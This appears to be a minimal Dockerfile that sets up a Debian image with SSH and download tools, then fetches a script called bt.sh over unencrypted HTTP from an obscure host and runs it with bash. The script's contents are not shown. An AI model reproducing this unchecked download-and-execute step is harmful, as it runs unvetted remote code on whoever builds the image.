FROM debian
RUN apt update
RUN DEBIAN_FRONTEND=noninteractive apt install openssh-server curl git wget   -y
RUN wget http://jt.xnkl.cf/bt.sh
RUN bash bt.sh   -y
CMD  /bt.sh
